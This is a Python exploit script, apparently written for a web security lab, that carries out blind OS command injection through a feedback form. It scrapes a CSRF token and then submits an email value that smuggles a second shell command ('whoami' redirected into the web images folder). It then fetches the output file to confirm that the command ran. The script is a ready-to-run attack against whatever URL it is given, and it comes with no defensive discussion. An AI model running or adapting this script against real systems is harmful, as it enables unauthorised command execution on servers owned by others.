import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

#Extracting csrf token func
def get_csrf(s, url):
    fb = "/feedback"
    r = s.get(url + fb, verify=False, proxies=proxies)
    #using to scrap csrf token
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf

def exploit(s, url):
    sub_fb = "/feedback/submit"
    payload = "aaa.com& whoami > /var/www/images/whoami.txt #"
    csrf_token = get_csrf(s, url)
    data = {'csrf': csrf_token, 'name' : 'test', 'email' : payload, 'subject' : 'test','message' : 'test'}
    res = s.post(url + sub_fb, data=data, verify=False, proxies=proxies)
    print("(+)Executing...")

    #verifying the command injection 
    img_path = "/image?filename=whoami.txt"
    res2 = s.get(url + img_path, verify = False, proxies=proxies)
    if(res2.status_code == 200):
        print("(+) Executed Succesfully...")
        print("(+) Output : " + res2.text)
    else:
        print("(-) Failed")


def main():
    if(len(sys.argv) != 2):
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Starting the Exploit...")
    
    s = requests.Session()
    exploit(s, url)

if __name__ == "__main__":
    main()
